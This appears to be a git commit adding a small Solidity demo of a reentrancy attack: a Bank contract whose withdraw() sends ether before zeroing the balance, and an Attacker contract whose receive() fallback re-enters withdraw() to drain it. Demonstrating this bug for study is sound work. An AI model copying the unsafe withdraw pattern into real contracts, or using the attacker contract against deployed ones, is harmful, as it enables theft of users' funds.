87e35c520005c27c7297201e1063955fe47b5ddf
BCHSBC <skhs0199@gmail.com>
2023-01-28 21:06:52 +0900

    first commit

---
+++ ex.sol
@@ -0,0 +1,50 @@
+//SPDX-License-Identifier: GPL-30
+pragma solidity >= 0.8.1;
+
+contract Bank{
+    mapping(address=> uint) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint currentBalance = balances[msg.sender];
+        (bool result,) = msg.sender.call{value:currentBalance}("");
+        require(result,"ERROR");
+        balances[msg.sender] = 0;
+    }
+
+    function checkBalance() external view returns(uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attacker {
+
+  
+    Bank public bank;
+    address public owner;
+    receive() payable external {
+        if(address(msg.sender).balance>0) {
+            bank.withdraw();
+        }
+    }
+
+    constructor(address _bank) {
+        bank = Bank(_bank);
+    }
+
+    function sendEther() external payable {
+        bank.deposit{value:msg.value}();
+    }
+
+    function withdrawEther() external {
+        bank.withdraw();
+    }
+
+    function chekcBalance() external view returns(uint) {
+        return address(this).balance;
+    }
+
+}
